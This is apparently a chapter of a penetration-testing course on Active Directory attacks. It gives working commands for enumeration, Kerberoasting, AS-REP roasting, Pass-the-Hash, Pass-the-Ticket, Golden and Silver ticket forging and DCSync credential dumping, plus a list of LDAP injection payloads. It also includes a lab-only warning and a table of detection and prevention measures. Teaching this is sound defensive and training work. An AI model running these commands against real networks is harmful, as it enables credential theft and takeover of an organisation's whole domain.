# Active Directory Attacks

**Previous**: [13. Privilege Escalation — Windows](./13_Privilege_Escalation_Windows.md) | **Next**: [15. Post-Exploitation](./15_Post_Exploitation.md)

---

Active Directory (AD) is the backbone of enterprise Windows environments, managing authentication, authorization, and resource access for millions of organizations worldwide. Because AD centralizes identity management, compromising it provides an attacker with access to virtually every resource in the environment.

> **IMPORTANT**: AD attacks should only be performed in authorized lab environments or contracted engagements.

**Difficulty**: ⭐⭐⭐⭐

## Learning Objectives

1. Understand Active Directory architecture and authentication
2. Enumerate AD using BloodHound and PowerView
3. Perform Kerberoasting to extract service account hashes
4. Execute Pass-the-Hash and Pass-the-Ticket attacks
5. Forge Golden and Silver Kerberos tickets
6. Perform DCSync attacks to extract domain credentials
7. Map attack paths from initial access to Domain Admin
8. Implement AD hardening and monitoring strategies

---

## Table of Contents

1. [Active Directory Architecture](#1-active-directory-architecture)
2. [AD Enumeration with BloodHound](#2-ad-enumeration-with-bloodhound)
3. [Kerberos Authentication Attacks](#3-kerberos-authentication-attacks)
4. [Kerberoasting](#4-kerberoasting)
5. [AS-REP Roasting](#5-as-rep-roasting)
6. [Pass-the-Hash and Pass-the-Ticket](#6-pass-the-hash-and-pass-the-ticket)
7. [Golden and Silver Tickets](#7-golden-and-silver-tickets)
8. [DCSync Attack](#8-dcsync-attack)
9. [LDAP Injection](#9-ldap-injection)
10. [AD Defense and Detection](#10-ad-defense-and-detection)
11. [Exercises](#11-exercises)
12. [Summary](#12-summary)
13. [References](#13-references)

---

## 1. Active Directory Architecture

### 1.1 Key Components

- **Domain Controller (DC)**: Server hosting AD database (NTDS.dit)
- **Forest**: Top-level AD container (collection of domains)
- **Domain**: Administrative boundary within a forest
- **Organizational Unit (OU)**: Container for organizing objects
- **Group Policy Object (GPO)**: Configuration policies applied to OUs

### 1.2 Authentication Protocols

| Protocol | Usage | Attack Surface |
|----------|-------|---------------|
| NTLM | Legacy authentication | Pass-the-Hash, Relay |
| Kerberos | Primary AD authentication | Kerberoasting, Golden Ticket |
| LDAP | Directory queries | LDAP injection, enumeration |

---

## 2. AD Enumeration with BloodHound

BloodHound uses graph theory to identify attack paths in Active Directory.

```powershell
# Collect data with SharpHound
.\SharpHound.exe --CollectionMethods All --Domain corp.local

# Or with PowerShell
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All

# Import JSON into BloodHound
# Look for: Shortest path to Domain Admin
#           Users with DCSync rights
#           Kerberoastable accounts
```

### 2.1 PowerView Enumeration

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | Select samaccountname, description
Get-DomainUser -SPN  # Kerberoastable accounts

# Groups
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# GPOs
Get-DomainGPO | Select displayname, gpcfilesyspath

# ACLs
Find-InterestingDomainAcl
```

---

## 3. Kerberos Authentication Attacks

### 3.1 Kerberos Authentication Flow

```
1. AS-REQ: Client → KDC (request TGT with password hash)
2. AS-REP: KDC → Client (TGT encrypted with krbtgt hash)
3. TGS-REQ: Client → KDC (request service ticket with TGT)
4. TGS-REP: KDC → Client (service ticket encrypted with service hash)
5. AP-REQ: Client → Service (present service ticket)
```

---

## 4. Kerberoasting

Kerberoasting requests service tickets for accounts with SPNs, then cracks them offline.

```bash
# Using Impacket
GetUserSPNs.py corp.local/user:password -dc-ip 10.0.0.1 -request

# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat (mode 13100)
hashcat -m 13100 hashes.txt rockyou.txt
```

---

## 5. AS-REP Roasting

Targets accounts with Kerberos pre-authentication disabled.

```bash
# Find vulnerable accounts
GetNPUsers.py corp.local/ -dc-ip 10.0.0.1 -usersfile users.txt -no-pass

# Crack with hashcat (mode 18200)
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

---

## 6. Pass-the-Hash and Pass-the-Ticket

### 6.1 Pass-the-Hash

Use NTLM hash directly without knowing the plaintext password:

```bash
# Using Impacket
psexec.py -hashes :aad3b435b51404eeaad3b435b51404ee:hash corp.local/admin@10.0.0.1
wmiexec.py -hashes :hash corp.local/admin@10.0.0.1

# Using CrackMapExec
crackmapexec smb 10.0.0.0/24 -u admin -H <ntlm_hash>
```

### 6.2 Pass-the-Ticket

Use Kerberos tickets (TGT or TGS) to authenticate:

```bash
# Export tickets with Rubeus
.\Rubeus.exe dump /service:krbtgt

# Import ticket with Mimikatz
kerberos::ptt ticket.kirbi

# Or with Impacket
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass corp.local/admin@dc01.corp.local
```

---

## 7. Golden and Silver Tickets

### 7.1 Golden Ticket

A forged TGT using the krbtgt hash — provides unlimited access to any service in the domain.

```bash
# Requires: krbtgt NTLM hash, domain SID
# Using Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt

# Using Impacket
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local Administrator
```

### 7.2 Silver Ticket

A forged service ticket using a service account's hash — access to a specific service.

```bash
# Using Mimikatz
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:<service_hash> /ptt
```

---

## 8. DCSync Attack

DCSync replicates the AD database, extracting all password hashes.

```bash
# Requires: Replicating Directory Changes privileges
# Using Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

# Using Impacket
secretsdump.py corp.local/admin:password@10.0.0.1

# Extract all hashes
secretsdump.py -just-dc corp.local/admin:password@10.0.0.1
```

---

## 9. LDAP Injection

```python
"""
LDAP injection testing payloads.

Demonstrates how LDAP queries can be manipulated
when user input is not properly sanitized.
"""

# Vulnerable LDAP query pattern:
# (&(uid={user_input})(password={pass_input}))

LDAP_INJECTION_PAYLOADS = [
    # Authentication bypass
    ("*", "Wildcard — matches any value"),
    ("admin)(&)", "Close filter, add always-true condition"),
    ("admin)(|(password=*)", "OR injection to bypass password check"),
    ("*)(uid=*))(|(uid=*", "Extract all users"),

    # Information disclosure
    ("*)(objectClass=*", "Enumerate all object classes"),
    ("*)(cn=*", "Enumerate all common names"),
]

# Defense: Always use parameterized LDAP queries
# Python-ldap example:
# conn.search_s(base_dn, ldap.SCOPE_SUBTREE,
#              f"(uid={ldap.filter.escape_filter_chars(user_input)})")


if __name__ == "__main__":
    print("LDAP Injection Payloads")
    print("=" * 50)
    for payload, desc in LDAP_INJECTION_PAYLOADS:
        print(f"  Payload: {payload}")
        print(f"  Purpose: {desc}\n")
```

---

## 10. AD Defense and Detection

| Attack | Detection | Prevention |
|--------|-----------|------------|
| Kerberoasting | Monitor TGS requests for many SPNs | Use strong passwords for service accounts |
| AS-REP Roasting | Monitor AS-REQ without pre-auth | Enable pre-authentication for all accounts |
| Pass-the-Hash | Detect NTLM auth with unusual sources | Disable NTLM, use Credential Guard |
| Golden Ticket | Monitor TGT with unusual lifetimes | Rotate krbtgt password regularly |
| DCSync | Monitor replication requests from non-DCs | Restrict replication rights |
| BloodHound | Detect LDAP enumeration patterns | Monitor sensitive AD queries |

---

## 11. Exercises

1. **AD Enumeration**: Set up a lab AD environment and enumerate it with BloodHound. Map paths to Domain Admin.
2. **Kerberoasting**: Find and crack a Kerberoastable service account in a lab environment.
3. **Pass-the-Hash**: Use a captured NTLM hash to move laterally to another machine.
4. **Golden Ticket**: After obtaining the krbtgt hash, forge a Golden Ticket and access any service.
5. **DCSync**: Perform a DCSync attack to extract all domain hashes.
6. **Full Chain**: Complete an AD attack chain from initial foothold to Domain Admin.

---

## 12. Summary

Active Directory attacks target the heart of enterprise identity management:

- **BloodHound** maps attack paths through AD trust relationships
- **Kerberoasting** extracts crackable service account hashes
- **Pass-the-Hash** reuses NTLM hashes for lateral movement
- **Golden Tickets** provide persistent, unlimited domain access
- **DCSync** extracts the entire credential database
- Defense requires strong passwords, monitoring, and least privilege

---

## 13. References

- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/fortra/impacket
- Rubeus: https://github.com/GhostPack/Rubeus
- Mimikatz: https://github.com/gentilkiwi/mimikatz
- HackTricks AD: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- Active Directory Security: https://adsecurity.org/
